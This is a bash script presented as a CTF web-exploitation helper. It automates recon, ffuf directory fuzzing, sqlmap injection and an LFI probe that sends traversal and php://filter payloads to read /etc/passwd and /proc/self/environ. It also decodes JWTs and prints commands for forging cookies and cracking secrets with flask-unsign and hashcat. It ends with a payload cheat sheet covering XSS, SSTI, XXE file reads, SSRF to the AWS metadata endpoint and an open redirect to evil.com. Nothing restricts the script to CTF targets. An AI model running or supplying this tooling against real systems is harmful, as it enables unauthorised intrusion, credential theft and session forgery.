#!/usr/bin/env bash
# ============================================================
# CTF Solver — Web Exploitation Helper
# Usage: bash web_helper.sh <URL or IP:PORT> [mode: enum|sqli|fuzz|all]
# ============================================================
TARGET="$1"
MODE="${2:-enum}"
if [ -z "$TARGET" ]; then echo "Usage: web_helper.sh <URL|IP:PORT> [enum|sqli|fuzz|lfi|jwt|all]"; exit 1; fi

CYAN="\e[36m"; GREEN="\e[32m"; YELLOW="\e[33m"; RESET="\e[0m"
hdr() { echo -e "\n${CYAN}══════ $1 ══════${RESET}\n"; }
mkdir -p /tmp/ctf/web_out

# Normalize URL
if ! echo "$TARGET" | grep -qE '^https?://'; then
  URL="http://$TARGET"
else
  URL="$TARGET"
fi
echo "Target URL: $URL"

hdr "INITIAL RECON"
echo "--- HTTP Headers ---"
curl -sv "$URL" -o /tmp/ctf/web_out/index.html 2>&1 | grep -E "^[<>*]" | head -40

echo "--- Response Preview ---"
cat /tmp/ctf/web_out/index.html | strings | head -30

echo "--- Flag in Response ---"
grep -iE '[a-zA-Z0-9_]+\{[^}]+\}' /tmp/ctf/web_out/index.html | head -5

echo "--- Interesting Headers ---"
curl -sI "$URL" 2>/dev/null | grep -iE 'server|x-powered|set-cookie|location|x-flag|flag|content-type' | head -20

echo "--- robots.txt ---"
curl -s "$URL/robots.txt" 2>/dev/null | head -20

echo "--- sitemap.xml ---"
curl -s "$URL/sitemap.xml" 2>/dev/null | head -20

echo "--- Source code comments ---"
curl -s "$URL" 2>/dev/null | grep -E '<!--.*-->|//.*|#.*' | head -20

if [[ "$MODE" == "enum" || "$MODE" == "all" ]]; then
  hdr "DIRECTORY ENUMERATION"
  echo "Running ffuf against $URL ..."
  ffuf -w /usr/share/wordlists/dirb/common.txt \
       -u "$URL/FUZZ" \
       -mc 200,201,204,301,302,307,401,403 \
       -t 50 -timeout 5 \
       -o /tmp/ctf/web_out/ffuf.json -of json 2>/dev/null | tail -20 || \
  echo "ffuf not installed — try: gobuster dir -u '$URL' -w /usr/share/wordlists/dirb/common.txt"

  echo "--- Interesting paths found ---"
  python3 -c "
import json, sys
try:
    with open('/tmp/ctf/web_out/ffuf.json') as f:
        data = json.load(f)
    for r in data.get('results',[]):
        print(f\"  {r['status']} {r['url']} ({r['length']} bytes)\")
except: pass
" 2>/dev/null
fi

if [[ "$MODE" == "sqli" || "$MODE" == "all" ]]; then
  hdr "SQL INJECTION (sqlmap)"
  echo "Running sqlmap on $URL..."
  sqlmap -u "$URL" --batch --level=2 --risk=1 \
         --output-dir=/tmp/ctf/web_out/sqlmap \
         --forms --crawl=2 2>/dev/null | tail -30 || echo "sqlmap not found"
fi

if [[ "$MODE" == "lfi" || "$MODE" == "all" ]]; then
  hdr "LFI / PATH TRAVERSAL CHECK"
  for param in "file" "page" "include" "path" "dir" "load" "template"; do
    for payload in "../../../../etc/passwd" "....//....//....//etc/passwd" "php://filter/convert.base64-encode/resource=index.php" "/proc/self/environ"; do
      RESPONSE=$(curl -s "$URL?$param=$payload" 2>/dev/null)
      if echo "$RESPONSE" | grep -qE 'root:|/bin/bash|base64|flag\{'; then
        echo "LFI found: param=$param payload=$payload"
        echo "$RESPONSE" | head -10
      fi
    done
  done

  echo "--- PHP Source via Filter ---"
  echo "Try: curl '$URL?file=php://filter/convert.base64-encode/resource=index' | base64 -d"
fi

if [[ "$MODE" == "jwt" || "$MODE" == "all" ]]; then
  hdr "JWT TOKEN ANALYSIS"
  echo "Checking cookies / Authorization headers for JWT..."
  TOKEN=$(curl -sc /tmp/ctf/web_out/cookies.txt "$URL" 2>/dev/null; grep -iE 'JWT|token|eyJ' /tmp/ctf/web_out/cookies.txt | awk '{print $7}' | head -1)
  if [ -n "$TOKEN" ]; then
    echo "JWT found: $TOKEN"
    python3 << PYEOF
import base64, json
token = "$TOKEN"
parts = token.split('.')
for i, part in enumerate(['Header','Payload']):
    padded = parts[i] + '=='
    try:
        decoded = base64.urlsafe_b64decode(padded).decode()
        print(f"{part}: {json.dumps(json.loads(decoded), indent=2)}")
    except Exception as e:
        print(f"{part} decode error: {e}")
PYEOF
    echo "Attack: alg:none"
    echo "  flask-unsign --decode --cookie '$TOKEN'"
    echo "  flask-unsign --sign --cookie '{\"role\":\"admin\"}' --secret 'secret'"
    echo "Attack: weak secret brute"
    echo "  hashcat -m 16500 '$TOKEN' /usr/share/wordlists/rockyou.txt"
  else
    echo "No JWT found in cookies (may be in localStorage or headers)"
  fi
fi

hdr "COMMON VULN PAYLOADS (manual check)"
echo "XSS:  <script>alert(1)</script>  |  \"><svg/onload=alert(1)>"
echo "SSTI: {{7*7}}  |  \${7*7}  |  #{7*7}"
echo "XXE:  <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
echo "SSRF: http://169.254.169.254/latest/meta-data/  (AWS metadata)"
echo "Open redirect: /redirect?url=https://evil.com"

hdr "WEB HELPER COMPLETE"
echo "Output: /tmp/ctf/web_out/"
ls /tmp/ctf/web_out/ 2>/dev/null
